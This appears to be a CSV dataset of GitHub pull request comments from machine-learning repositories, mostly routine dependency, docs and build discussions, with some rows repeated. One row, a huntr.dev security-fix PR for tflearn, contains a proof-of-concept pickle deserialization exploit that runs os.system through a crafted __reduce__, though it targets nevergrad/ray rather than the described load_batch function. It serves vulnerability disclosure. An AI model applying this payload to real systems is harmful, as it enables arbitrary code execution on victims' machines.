REPO NAME,REPO OWNER,PR.NO,AUTHOR,TITLE,DATE,COMMENT,LEVEL
gensim,RaRe-Technologies,3209,tbbharaj,Fix aarch64 wheels,2021-08-02T22:03:37Z,"This PR addresses the issue to build aarch64 wheels.
Travis build for Python 3.9 is failing because it couldn't find matching scipy distribution == 1.5.3. This issue is being addressed in this PR.

If there are any questions/comments - I'd be happy fix things as needed.

Thank you
Tanveen",0
gensim,RaRe-Technologies,3209,piskvorky,Fix aarch64 wheels,2021-08-03T07:14:59Z,"Thanks! Shouldn't these versions match `setup.py` though?

I forgot what exactly needs to be updated where, so everything's in syncâ€¦ @mpenkov could you please summarize the way we update dependencies across the different files / subsystems in [Gensim & Compatibility](https://github.com/RaRe-Technologies/gensim/wiki/Gensim-And-Compatibility).",1
gensim,RaRe-Technologies,3209,tbbharaj,Fix aarch64 wheels,2021-08-10T23:35:08Z,"> Thanks! Shouldn't these versions match `setup.py` though?
> 
> I forgot what exactly needs to be updated where, so everything's in syncâ€¦ @mpenkov could you please summarize the way we update dependencies across the different files / subsystems in [Gensimi & Compatibility](https://github.com/RaRe-Technologies/gensim/wiki/Gensim-And-Compatibility)

Thank you @piskvorky for reviewing my PR.
[setup.py](https://github.com/RaRe-Technologies/gensim/blob/develop/setup.py#L328) defines `'scipy >= 0.18.1'`, this should be okay with existing changes in PR isn't?

Also `scipy==1.5.3` doesn't have build for [Python 3.9](https://pypi.org/project/scipy/1.5.3/#files), therefore for Python 3.6 scipy is configured as `scipy==1.5.3` and [1.7.0 ](https://pypi.org/project/scipy/1.7.0/#files)for others which is latest",1
python-machine-learning-book,rasbt,90,AliHaider20,Update .gitignore,2020-10-16T04:50:43Z,,0
dive-into-machine-learning,hangtwenty,136,itko,Add links to browser-based tools,2021-05-16T00:46:39Z,"I added links to examples of browser-based notebooks. As someone who struggled with installing Python and Jupyter when I just got started, browser-based was a great way for me to get started without getting into the weeds of setting up my environment properly.",0
Awesome-pytorch-list,bharathgs,115,BIGBALLON,Add Distribuuu,2021-03-12T17:02:21Z,"Distribuuuu is a Distributed Classification Training Framework powered by native PyTorch.
",0
tflearn,tflearn,1163,huntr-helper,Security Fix for Arbitrary Code Execution - huntr.dev,2021-01-25T09:41:57Z,"https://huntr.dev/users/Anon-Artist has fixed the Arbitrary Code Execution vulnerability ðŸ”¨. Think you could fix a vulnerability like this?

Get involved at https://huntr.dev/

Q | A
Version Affected | ALL
Bug Fix | YES
Original Pull Request | https://github.com/418sec/tflearn/pull/1
Vulnerability README | https://github.com/418sec/huntr/blob/master/bounties/pip/tflearn/1/README.md

### User Comments:

### :bar_chart: Metadata *

TFlearn is a modular and transparent deep learning library built on top of Tensorflow. It was designed to provide a higher-level API to TensorFlow in order to facilitate and speed-up experimentations, while remaining fully transparent and compatible with it. This package was vulnerable to Arbitrary Code Execution.

#### Bounty URL: https://www.huntr.dev/bounties/1-pip-tflearn

### :gear: Description *

load_batch() function is used to load CIFAR 10 dataset for training. Lack of restriction in input allowes attacker-crafted file to get unpickled which causes code execution.

### :computer: Technical Description *

Fixed by avoiding unsafe loader.

### :bug: Proof of Concept (PoC) *

Create the following PoC file:
exploit.py

```
import pickle
import os
import nevergrad
from ray.tune.suggest.nevergrad import NevergradSearch

class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('calc.exe', ))

payload = pickle.dumps(EvilPickle())
optimizer = nevergrad.optimization.Optimizer(1)
ngSearch = NevergradSearch(optimizer)

with open('payload', 'wb') as f:
    f.write(payload)

ngSearch.restore('payload')

```

Execute the following commands in another terminal:

```
python3 exploit.py
```

    Check the Output:

xcalc will pop up.

### :fire: Proof of Fix (PoF) *

After fix it will not popup a calc.

### :+1: User Acceptance Testing (UAT)

After fix functionality is unaffected.
",0
awesome-bigdata,onurakpolat,306,zackkhan,added Hightouch to Data Ingestion section,2021-08-07T00:39:51Z,Added https://hightouch.io/ to Data Ingestion section,0
allennlp,allenai,5357,dependabot[bot],"Update google-cloud-storage requirement from <1.42.0,>=1.38.0 to >=1.38.0,<1.43.0",2021-08-12T13:03:03Z,"Updates the requirements on [google-cloud-storage](https://github.com/googleapis/python-storage) to permit the latest version.
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/googleapis/python-storage/releases"">google-cloud-storage's releases</a>.</em></p>
<blockquote>
<h2>v1.42.0</h2>
<h3>Features</h3>
<ul>
<li>add 'page_size' parameter to 'Bucket.list_blobs, list_buckets (<a href=""https://github-redirect.dependabot.com/googleapis/python-storage/issues/520"">#520</a>) (<a href=""https://www.github.com/googleapis/python-storage/commit/c5f4ad8fddd1849a4229b0126c4c022bccb90128"">c5f4ad8</a>)</li>
</ul>
<h3>Bug Fixes</h3>
<ul>
<li><strong>deps:</strong> add explicit ranges for 'google-api-core' and 'google-auth' (<a href=""https://github-redirect.dependabot.com/googleapis/python-storage/issues/530"">#530</a>) (<a href=""https://www.github.com/googleapis/python-storage/commit/310f207411da0382af310172344f19c644c14e6a"">310f207</a>)</li>
<li>downloading no longer marks metadata fields as 'changed' (<a href=""https://github-redirect.dependabot.com/googleapis/python-storage/issues/523"">#523</a>) (<a href=""https://www.github.com/googleapis/python-storage/commit/160d1ecb41f1f269b25cb68b2d2f7daf418bf01c"">160d1ec</a>)</li>
<li>make 'requests.exceptions.ChunkedEncodingError retryable by default (<a href=""https://github-redirect.dependabot.com/googleapis/python-storage/issues/526"">#526</a>) (<a href=""https://www.github.com/googleapis/python-storage/commit/4abb40310eca7ec45afc4bc5e4dfafbe083e74d2"">4abb403</a>)</li>
</ul>
<h3>Documentation</h3>
<ul>
<li>update supported / removed Python versions in README (<a href=""https://github-redirect.dependabot.com/googleapis/python-storage/issues/519"">#519</a>) (<a href=""https://www.github.com/googleapis/python-storage/commit/1f1b138865fb171535ee0cf768aff1987ed58914"">1f1b138</a>)</li>
</ul>
</blockquote>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/googleapis/python-storage/blob/master/CHANGELOG.md"">google-cloud-storage's changelog</a>.</em></p>
<blockquote>
<h2><a href=""https://www.github.com/googleapis/python-storage/compare/v1.41.1...v1.42.0"">1.42.0</a> (2021-08-05)</h2>
<h3>Features</h3>
<ul>
<li>add 'page_size' parameter to 'Bucket.list_blobs, list_buckets (<a href=""https://github-redirect.dependabot.com/googleapis/python-storage/issues/520"">#520</a>) (<a href=""https://www.github.com/googleapis/python-storage/commit/c5f4ad8fddd1849a4229b0126c4c022bccb90128"">c5f4ad8</a>)</li>
</ul>
<h3>Bug Fixes</h3>
<ul>
<li><strong>deps:</strong> add explicit ranges for 'google-api-core' and 'google-auth' (<a href=""https://github-redirect.dependabot.com/googleapis/python-storage/issues/530"">#530</a>) (<a href=""https://www.github.com/googleapis/python-storage/commit/310f207411da0382af310172344f19c644c14e6a"">310f207</a>)</li>
<li>downloading no longer marks metadata fields as 'changed' (<a href=""https://github-redirect.dependabot.com/googleapis/python-storage/issues/523"">#523</a>) (<a href=""https://www.github.com/googleapis/python-storage/commit/160d1ecb41f1f269b25cb68b2d2f7daf418bf01c"">160d1ec</a>)</li>
<li>make 'requests.exceptions.ChunkedEncodingError retryable by default (<a href=""https://github-redirect.dependabot.com/googleapis/python-storage/issues/526"">#526</a>) (<a href=""https://www.github.com/googleapis/python-storage/commit/4abb40310eca7ec45afc4bc5e4dfafbe083e74d2"">4abb403</a>)</li>
</ul>
<h3>Documentation</h3>
<ul>
<li>update supported / removed Python versions in README (<a href=""https://github-redirect.dependabot.com/googleapis/python-storage/issues/519"">#519</a>) (<a href=""https://www.github.com/googleapis/python-storage/commit/1f1b138865fb171535ee0cf768aff1987ed58914"">1f1b138</a>)</li>
</ul>
<h3><a href=""https://www.github.com/googleapis/python-storage/compare/v1.41.0...v1.41.1"">1.41.1</a> (2021-07-20)</h3>
<h3>Bug Fixes</h3>
<ul>
<li><strong>deps:</strong> pin <code>{api,cloud}-core</code>, <code>auth</code> to allow 2.x versions on Python 3 (<a href=""https://github-redirect.dependabot.com/googleapis/python-storage/issues/512"">#512</a>) (<a href=""https://www.github.com/googleapis/python-storage/commit/4d7500e39c51efd817b8363b69c88be040f3edb8"">4d7500e</a>)</li>
<li>remove trailing commas from error message constants (<a href=""https://github-redirect.dependabot.com/googleapis/python-storage/issues/505"">#505</a>) (<a href=""https://www.github.com/googleapis/python-storage/commit/d4a86ceb7a7c5e00ba7bae37c7078d52478040ff"">d4a86ce</a>), closes <a href=""https://github-redirect.dependabot.com/googleapis/python-storage/issues/501"">#501</a></li>
</ul>
<h3>Documentation</h3>
<ul>
<li>replace usage of deprecated function <code>download_as_string</code> in docs (<a href=""https://github-redirect.dependabot.com/googleapis/python-storage/issues/508"">#508</a>) (<a href=""https://www.github.com/googleapis/python-storage/commit/8dfa4d429dce94b671dc3e3755e52ab82733f61a"">8dfa4d4</a>)</li>
</ul>
<h2><a href=""https://www.github.com/googleapis/python-storage/compare/v1.40.0...v1.41.0"">1.41.0</a> (2021-07-13)</h2>
<h3>Features</h3>
<ul>
<li>add support for Etag headers on reads (<a href=""https://github-redirect.dependabot.com/googleapis/python-storage/issues/489"">#489</a>) (<a href=""https://www.github.com/googleapis/python-storage/commit/741d3fda4e4280022cede29ebeb7c2ea09e73b6f"">741d3fd</a>)</li>
</ul>
<h3>Bug Fixes</h3>
<ul>
<li><strong>deps:</strong> update minimum dependency versions to pick up bugfixes (<a href=""https://github-redirect.dependabot.com/googleapis/python-storage/issues/496"">#496</a>) (<a href=""https://www.github.com/googleapis/python-storage/commit/92251a5c8ea4d663773506eb1c630201a657aa69"">92251a5</a>), closes <a href=""https://github-redirect.dependabot.com/googleapis/python-storage/issues/494"">#494</a></li>
<li>populate etag / generation / metageneration properties during download (<a href=""https://github-redirect.dependabot.com/googleapis/python-storage/issues/488"">#488</a>) (<a href=""https://www.github.com/googleapis/python-storage/commit/49ba14c9c47dbe6bc2bb45d53bbe5621c131fbcb"">49ba14c</a>)</li>
<li>revise and rename is_etag_in_json(data) (<a href=""https://github-redirect.dependabot.com/googleapis/python-storage/issues/483"">#483</a>) (<a href=""https://www.github.com/googleapis/python-storage/commit/0a5254647bf1155874fe48f3891bcc34a76b0b81"">0a52546</a>)</li>
</ul>
<h2><a href=""https://www.github.com/googleapis/python-storage/compare/v1.39.0...v1.40.0"">1.40.0</a> (2021-06-30)</h2>
<h3>Features</h3>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/googleapis/python-storage/commit/fcf9a07a49250886f7baba04a8399286e6a5f13b""><code>fcf9a07</code></a> chore: release 1.42.0 (<a href=""https://github-redirect.dependabot.com/googleapis/python-storage/issues/522"">#522</a>)</li>
<li><a href=""https://github.com/googleapis/python-storage/commit/310f207411da0382af310172344f19c644c14e6a""><code>310f207</code></a> fix(deps): add explicit ranges for 'google-api-core' and 'google-auth' (<a href=""https://github-redirect.dependabot.com/googleapis/python-storage/issues/530"">#530</a>)</li>
<li><a href=""https://github.com/googleapis/python-storage/commit/ef41bc1a744d5d65961dd5c7c3a4e04b353ef7ae""><code>ef41bc1</code></a> chore: require CODEOWNER review and up to date branches (<a href=""https://github-redirect.dependabot.com/googleapis/python-storage/issues/531"">#531</a>)</li>
<li><a href=""https://github.com/googleapis/python-storage/commit/4abb40310eca7ec45afc4bc5e4dfafbe083e74d2""><code>4abb403</code></a> fix: make 'requests.exceptions.ChunkedEncodingError retryable by default (<a href=""https://github-redirect.dependabot.com/googleapis/python-storage/issues/526"">#526</a>)</li>
<li><a href=""https://github.com/googleapis/python-storage/commit/aefe1987248e564dca493805229694df93a77505""><code>aefe198</code></a> chore: fix kokoro config for samples (<a href=""https://github-redirect.dependabot.com/googleapis/python-storage/issues/524"">#524</a>)</li>
<li><a href=""https://github.com/googleapis/python-storage/commit/160d1ecb41f1f269b25cb68b2d2f7daf418bf01c""><code>160d1ec</code></a> fix: downloading no longer marks metadata fields as 'changed' (<a href=""https://github-redirect.dependabot.com/googleapis/python-storage/issues/523"">#523</a>)</li>
<li><a href=""https://github.com/googleapis/python-storage/commit/c5f4ad8fddd1849a4229b0126c4c022bccb90128""><code>c5f4ad8</code></a> feat: add 'page_size' parameter to 'Bucket.list_blobs, list_buckets (<a href=""https://github-redirect.dependabot.com/googleapis/python-storage/issues/520"">#520</a>)</li>
<li><a href=""https://github.com/googleapis/python-storage/commit/1f1b138865fb171535ee0cf768aff1987ed58914""><code>1f1b138</code></a> docs: update supported / removed Python versions in README (<a href=""https://github-redirect.dependabot.com/googleapis/python-storage/issues/519"">#519</a>)</li>
<li><a href=""https://github.com/googleapis/python-storage/commit/24ea536b1c67deec09770bddc0008c57994f0408""><code>24ea536</code></a> tests: use 120 sec timeout for 'blob.delete' during teardown (<a href=""https://github-redirect.dependabot.com/googleapis/python-storage/issues/518"">#518</a>)</li>
<li><a href=""https://github.com/googleapis/python-storage/commit/521e2bf45cce380b7b22888092383ab2a5a0287b""><code>521e2bf</code></a> chore: release 1.41.1 (<a href=""https://github-redirect.dependabot.com/googleapis/python-storage/issues/509"">#509</a>)</li>
<li>Additional commits viewable in <a href=""https://github.com/googleapis/python-storage/compare/v1.38.0...v1.42.0"">compare view</a></li>
</ul>
</details>
<br />


Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)


</details>",0
keras,keras-team,15254,copybara-service[bot],"Fix error message for `sparse` setting in IndexLookup layer when `output_mode = ""int""`.",2021-08-25T22:20:43Z,"Fix error message for `sparse` setting in IndexLookup layer when `output_mode = ""int""`.
",0
scikit-learn,scikit-learn,20851,baam25simo,[WIP] DOC Ensures that FeatureAgglomeration passes numpydoc validation,2021-08-26T15:31:39Z,"#### Reference Issues/PRs

Addresses #20308 


#### What does this implement/fix? Explain your changes.

- `FeatureAgglomeration` removed from `DOCSTRING_IGNORE_LIST` in test_docstrings.py
- In `FeatureAgglomeration` : ""See Also"" section added.
- In `FeatureAgglomeration.fit` : `**params` parameter description added, self description added.
- In `AgglomerationTransform.inverse_transform` : summary modified.
- In `AgglomerationTransform`.transform : summary modified.


#### Any other comments?

Running `pytest maint_tools/test_docstrings.py -k FeatureAgglomeration-` in this branch I obtain:

```
====================================== test session starts ======================================
platform linux -- Python 3.8.5, pytest-6.2.4, py-1.10.0, pluggy-0.13.1
rootdir: /.../.../scikit-learn, configfile: setup.cfg
plugins: cov-2.12.1, anyio-2.2.0
collected 1760 items / 1752 deselected / 8 selected                                             

maint_tools/test_docstrings.py ..F.....                                                   [100%]

=========================================== FAILURES ============================================
_______________________ test_docstring[FeatureAgglomeration-fit_predict] ________________________

Estimator = <class 'sklearn.cluster._agglomerative.FeatureAgglomeration'>, method = 'fit_predict'
request = <FixtureRequest for <Function test_docstring[FeatureAgglomeration-fit_predict]>>

    @pytest.mark.parametrize(""Estimator, method"", get_all_methods())
    def test_docstring(Estimator, method, request):
        base_import_path = Estimator.__module__
        import_path = [base_import_path, Estimator.__name__]
        if method is not None:
            import_path.append(method)
    
        import_path = ""."".join(import_path)
    
        if Estimator.__name__ in DOCSTRING_IGNORE_LIST:
            request.applymarker(
                pytest.mark.xfail(run=False, reason=""TODO pass numpydoc validation"")
            )
    
        res = numpydoc_validation.validate(import_path)
    
        res[""errors""] = list(filter_errors(res[""errors""], method, Estimator=Estimator))
    
        if res[""errors""]:
            msg = repr_errors(res, Estimator, method)
    
>           raise ValueError(msg)
E           ValueError: 
E           
E           None
E           
E           FeatureAgglomeration.fit_predict
E           Parsing of the method signature failed, possibly because this is a property.
E           
E           Fit the hierarchical clustering from features or distance matrix,
E           and return cluster labels.
E           
E           Parameters
E           ----------
E           X : array-like of shape (n_samples, n_features) or                 (n_samples, n_samples)
E               Training instances to cluster, or distances between instances if
E               ``affinity='precomputed'``.
E           
E           y : Ignored
E               Not used, present here for API consistency by convention.
E           
E           Returns
E           -------
E           labels : ndarray of shape (n_samples,)
E               Cluster labels.
E           
E           # Errors
E           
E            - GL08: The object does not have a docstring

maint_tools/test_docstrings.py:252: ValueError
========================= 1 failed, 7 passed, 1752 deselected in 1.03s ==========================

```

which I was not able to solve. Any suggestions?

Thank you!
",0
scikit-learn,scikit-learn,20851,baam25simo,[WIP] DOC Ensures that FeatureAgglomeration passes numpydoc validation,2021-08-26T16:00:01Z,"Found out that
`AgglomerativeClustering.fit_predict()` returns `super().fit_predict(X, y)`
which is `ClusterMixin.fit_predict()` which returns `self.labels_` 
which is actually an instance constant declared in _agglomerative.py lines 976-982

Can numpydoc validation be considered passed?",1
keras,keras-team,15254,copybara-service[bot],"Fix error message for `sparse` setting in IndexLookup layer when `output_mode = ""int""`.",2021-08-25T22:20:43Z,"Fix error message for `sparse` setting in IndexLookup layer when `output_mode = ""int""`.
",0
scikit-learn,scikit-learn,20851,baam25simo,[WIP] DOC Ensures that FeatureAgglomeration passes numpydoc validation,2021-08-26T15:31:39Z,"#### Reference Issues/PRs

Addresses #20308 


#### What does this implement/fix? Explain your changes.

- `FeatureAgglomeration` removed from `DOCSTRING_IGNORE_LIST` in test_docstrings.py
- In `FeatureAgglomeration` : ""See Also"" section added.
- In `FeatureAgglomeration.fit` : `**params` parameter description added, self description added.
- In `AgglomerationTransform.inverse_transform` : summary modified.
- In `AgglomerationTransform`.transform : summary modified.


#### Any other comments?

Running `pytest maint_tools/test_docstrings.py -k FeatureAgglomeration-` in this branch I obtain:

```
====================================== test session starts ======================================
platform linux -- Python 3.8.5, pytest-6.2.4, py-1.10.0, pluggy-0.13.1
rootdir: /.../.../scikit-learn, configfile: setup.cfg
plugins: cov-2.12.1, anyio-2.2.0
collected 1760 items / 1752 deselected / 8 selected                                             

maint_tools/test_docstrings.py ..F.....                                                   [100%]

=========================================== FAILURES ============================================
_______________________ test_docstring[FeatureAgglomeration-fit_predict] ________________________

Estimator = <class 'sklearn.cluster._agglomerative.FeatureAgglomeration'>, method = 'fit_predict'
request = <FixtureRequest for <Function test_docstring[FeatureAgglomeration-fit_predict]>>

    @pytest.mark.parametrize(""Estimator, method"", get_all_methods())
    def test_docstring(Estimator, method, request):
        base_import_path = Estimator.__module__
        import_path = [base_import_path, Estimator.__name__]
        if method is not None:
            import_path.append(method)
    
        import_path = ""."".join(import_path)
    
        if Estimator.__name__ in DOCSTRING_IGNORE_LIST:
            request.applymarker(
                pytest.mark.xfail(run=False, reason=""TODO pass numpydoc validation"")
            )
    
        res = numpydoc_validation.validate(import_path)
    
        res[""errors""] = list(filter_errors(res[""errors""], method, Estimator=Estimator))
    
        if res[""errors""]:
            msg = repr_errors(res, Estimator, method)
    
>           raise ValueError(msg)
E           ValueError: 
E           
E           None
E           
E           FeatureAgglomeration.fit_predict
E           Parsing of the method signature failed, possibly because this is a property.
E           
E           Fit the hierarchical clustering from features or distance matrix,
E           and return cluster labels.
E           
E           Parameters
E           ----------
E           X : array-like of shape (n_samples, n_features) or                 (n_samples, n_samples)
E               Training instances to cluster, or distances between instances if
E               ``affinity='precomputed'``.
E           
E           y : Ignored
E               Not used, present here for API consistency by convention.
E           
E           Returns
E           -------
E           labels : ndarray of shape (n_samples,)
E               Cluster labels.
E           
E           # Errors
E           
E            - GL08: The object does not have a docstring

maint_tools/test_docstrings.py:252: ValueError
========================= 1 failed, 7 passed, 1752 deselected in 1.03s ==========================

```

which I was not able to solve. Any suggestions?

Thank you!
",0
scikit-learn,scikit-learn,20851,baam25simo,[WIP] DOC Ensures that FeatureAgglomeration passes numpydoc validation,2021-08-26T16:00:01Z,"Found out that
`AgglomerativeClustering.fit_predict()` returns `super().fit_predict(X, y)`
which is `ClusterMixin.fit_predict()` which returns `self.labels_` 
which is actually an instance constant declared in _agglomerative.py lines 976-982

Can numpydoc validation be considered passed?",1
